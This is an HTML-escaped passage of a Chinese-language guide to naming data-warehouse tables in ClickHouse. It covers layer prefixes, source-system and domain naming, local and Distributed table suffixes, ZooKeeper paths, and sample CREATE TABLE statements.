 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;h3 class="heading-element" id="101-行业级数仓表命名总规范核心"&gt;&lt;span&gt;10.1. 行业级数仓表命名总规范（核心）&lt;/span&gt;
 &lt;a href="#101-%e8%a1%8c%e4%b8%9a%e7%ba%a7%e6%95%b0%e4%bb%93%e8%a1%a8%e5%91%bd%e5%90%8d%e6%80%bb%e8%a7%84%e8%8c%83%e6%a0%b8%e5%bf%83" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;统一命名模型（强烈推荐）
&lt;pre&gt;&lt;code&gt;&amp;lt;数据层&amp;gt;_&amp;lt;来源系统&amp;gt;_&amp;lt;业务域&amp;gt;_&amp;lt;业务实体&amp;gt;_&amp;lt;加工类型&amp;gt;_&amp;lt;时间粒度&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;表名本身就是一份“元数据”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol start="2"&gt;
&lt;li&gt;字段含义说明
&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;组成&lt;/th&gt;
 &lt;th&gt;含义&lt;/th&gt;
 &lt;th&gt;示例&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td&gt;数据层&lt;/td&gt;
 &lt;td&gt;数仓分层&lt;/td&gt;
 &lt;td&gt;ods / dwd / dws / dim / ads&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;来源系统&lt;/td&gt;
 &lt;td&gt;数据来源系统&lt;/td&gt;
 &lt;td&gt;crm / erp / app / pay / log&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;业务域&lt;/td&gt;
 &lt;td&gt;一级业务域&lt;/td&gt;
 &lt;td&gt;trade / user / content&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;业务实体&lt;/td&gt;
 &lt;td&gt;核心业务对象&lt;/td&gt;
 &lt;td&gt;order / user / sku&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;加工类型&lt;/td&gt;
 &lt;td&gt;明细/汇总/拉链等&lt;/td&gt;
 &lt;td&gt;detail / snapshot / acc&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;时间粒度&lt;/td&gt;
 &lt;td&gt;数据粒度&lt;/td&gt;
 &lt;td&gt;day / hour / month / full&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h3 class="heading-element" id="102-clickhouse-表类型命名规范"&gt;&lt;span&gt;10.2. ClickHouse 表类型命名规范&lt;/span&gt;
 &lt;a href="#102-clickhouse-%e8%a1%a8%e7%b1%bb%e5%9e%8b%e5%91%bd%e5%90%8d%e8%a7%84%e8%8c%83" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;code&gt;ReplicatedMergeTree（本地表）&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;命名规则&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;数据层&amp;gt;_&amp;lt;来源系统&amp;gt;_&amp;lt;业务域&amp;gt;_&amp;lt;业务实体&amp;gt;_&amp;lt;加工类型&amp;gt;_&amp;lt;时间粒度&amp;gt;_local&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;示例&lt;/p&gt;
&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;场景&lt;/th&gt;
 &lt;th&gt;表名&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td&gt;订单明细事实表&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;dwd_erp_trade_order_detail_day_local&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;用户行为日志&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;ods_app_log_user_action_detail_local&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;商品维度表&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;dim_erp_product_sku_snapshot_full_local&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;用户日汇总&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;dws_app_user_login_acc_day_local&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start="2"&gt;
&lt;li&gt;&lt;code&gt;Distributed（分布式表）&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;命名规则
&lt;pre&gt;&lt;code&gt;&amp;lt;数据层&amp;gt;_&amp;lt;来源系统&amp;gt;_&amp;lt;业务域&amp;gt;_&amp;lt;业务实体&amp;gt;_&amp;lt;加工类型&amp;gt;_&amp;lt;时间粒度&amp;gt;_(all|dist)&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;示例
&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;Distributed 表&lt;/th&gt;
 &lt;th&gt;对应 Local&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;dwd_erp_trade_order_detail_day_all&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;dwd_erp_trade_order_detail_day_local&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;ods_app_log_user_action_detail_all&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;ods_app_log_user_action_detail_local&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;dim_erp_product_sku_snapshot_full_all&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;dim_erp_product_sku_snapshot_full_local&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;_all&lt;/code&gt; 代表全量数据(跨shard)&lt;br&gt;
&lt;code&gt;_dist&lt;/code&gt; 分布式路由&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;如何抉择 &lt;code&gt;_all&lt;/code&gt;/&lt;code&gt;_dist&lt;/code&gt; ?
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;数仓&lt;/code&gt; / &lt;code&gt;业务&lt;/code&gt; / &lt;code&gt;BI&lt;/code&gt; / &lt;code&gt;数据服务&lt;/code&gt; 应该只认&lt;code&gt;_all&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;工程&lt;/code&gt; / &lt;code&gt;运维&lt;/code&gt; / &lt;code&gt;底层路由&lt;/code&gt; 可以存在 &lt;code&gt;_dist&lt;/code&gt;, 但不应用于业务使用。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 class="heading-element" id="103-数据层级命名行业标准"&gt;&lt;span&gt;10.3. 数据层级命名（行业标准）&lt;/span&gt;
 &lt;a href="#103-%e6%95%b0%e6%8d%ae%e5%b1%82%e7%ba%a7%e5%91%bd%e5%90%8d%e8%a1%8c%e4%b8%9a%e6%a0%87%e5%87%86" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;层级&lt;/th&gt;
 &lt;th&gt;含义&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;ods&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;贴源数据（准实时/离线）&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;dwd&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;明细事实（业务语义清洗）&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;dws&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;轻度汇总（公共指标）&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;dim&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;维度表&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;ads&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;应用层 / 报表层&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ClickHouse 通常以 dwd / dws / ads 为主&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 class="heading-element" id="104-来源系统命名规范"&gt;&lt;span&gt;10.4. 来源系统命名规范&lt;/span&gt;
 &lt;a href="#104-%e6%9d%a5%e6%ba%90%e7%b3%bb%e7%bb%9f%e5%91%bd%e5%90%8d%e8%a7%84%e8%8c%83" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;命名原则&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用 &lt;strong&gt;稳定系统标识&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;不使用部署名、环境名&lt;/li&gt;
&lt;li&gt;多源不混用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;示例&lt;/p&gt;
&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;系统&lt;/th&gt;
 &lt;th&gt;命名&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td&gt;App 埋点&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;app&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;ERP&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;erp&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;CRM&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;crm&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;支付&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;pay&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;日志平台&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;log&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;第三方&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;third&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 class="heading-element" id="105-业务域--业务实体规范"&gt;&lt;span&gt;10.5 业务域 &amp;amp; 业务实体规范&lt;/span&gt;
 &lt;a href="#105-%e4%b8%9a%e5%8a%a1%e5%9f%9f--%e4%b8%9a%e5%8a%a1%e5%ae%9e%e4%bd%93%e8%a7%84%e8%8c%83" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;业务域（Domain）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;trade / user / content / finance / risk&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;业务实体（Entity）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;order / refund / user / sku / coupon&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;实体名必须是“名词”&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 class="heading-element" id="105-加工类型行业强约定"&gt;&lt;span&gt;10.5. 加工类型（行业强约定）&lt;/span&gt;
 &lt;a href="#105-%e5%8a%a0%e5%b7%a5%e7%b1%bb%e5%9e%8b%e8%a1%8c%e4%b8%9a%e5%bc%ba%e7%ba%a6%e5%ae%9a" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;类型&lt;/th&gt;
 &lt;th&gt;含义&lt;/th&gt;
 &lt;th&gt;说明&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;detail&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;明细事实&lt;/td&gt;
 &lt;td&gt;一行一业务事件&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;snapshot&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;快照&lt;/td&gt;
 &lt;td&gt;当前状态&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;acc&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;累计&lt;/td&gt;
 &lt;td&gt;期间累计&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;delta&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;增量&lt;/td&gt;
 &lt;td&gt;变更数据&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;zipper&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;拉链表&lt;/td&gt;
 &lt;td&gt;状态变更历史&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 class="heading-element" id="107-时间粒度命名"&gt;&lt;span&gt;10.7. 时间粒度命名&lt;/span&gt;
 &lt;a href="#107-%e6%97%b6%e9%97%b4%e7%b2%92%e5%ba%a6%e5%91%bd%e5%90%8d" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;粒度&lt;/th&gt;
 &lt;th&gt;示例&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td&gt;明细&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;full&lt;/code&gt; / &lt;code&gt;detail&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;小时&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;hour&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;天&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;day&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;月&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;month&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 class="heading-element" id="108-zookeeper-路径命名规范clickhouse-特有"&gt;&lt;span&gt;10.8. ZooKeeper 路径命名规范（ClickHouse 特有）&lt;/span&gt;
 &lt;a href="#108-zookeeper-%e8%b7%af%e5%be%84%e5%91%bd%e5%90%8d%e8%a7%84%e8%8c%83clickhouse-%e7%89%b9%e6%9c%89" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;/clickhouse/tables/{shard}/&amp;lt;db_name&amp;gt;/&amp;lt;table_name&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;与 &lt;strong&gt;Distributed 表同名&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;不带 &lt;code&gt;_local&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 class="heading-element" id="109-完整示例"&gt;&lt;span&gt;10.9. 完整示例&lt;/span&gt;
 &lt;a href="#109-%e5%ae%8c%e6%95%b4%e7%a4%ba%e4%be%8b" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;ReplicatedMergeTree（本地表）&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;CREATE TABLE dbtest.dwd_erp_trade_order_detail_day_local
(
 order_id UInt64,
 user_id UInt64,
 order_amount Decimal(18,2),
 order_time DateTime
)
ENGINE = ReplicatedMergeTree(
 &amp;#39;/clickhouse/tables/{shard}/dbtest/dwd_erp_trade_order_detail_day&amp;#39;,
 &amp;#39;{replica}&amp;#39;
)
PARTITION BY toYYYYMM(order_time)
ORDER BY (order_id);&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;Distributed 表&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;CREATE TABLE dbtest.dwd_erp_trade_order_detail_day_dist
AS dwd_erp_trade_order_detail_day_local
ENGINE = Distributed(
 ck_cluster,
 default,
 dwd_erp_trade_order_detail_day_local,
 cityHash64(order_id)
);&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 class="heading-element" id="1010-命名反例行业强禁止"&gt;&lt;span&gt;10.10. 命名反例（行业强禁止）&lt;/span&gt;
 &lt;a href="#1010-%e5%91%bd%e5%90%8d%e5%8f%8d%e4%be%8b%e8%a1%8c%e4%b8%9a%e5%bc%ba%e7%a6%81%e6%ad%a2" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
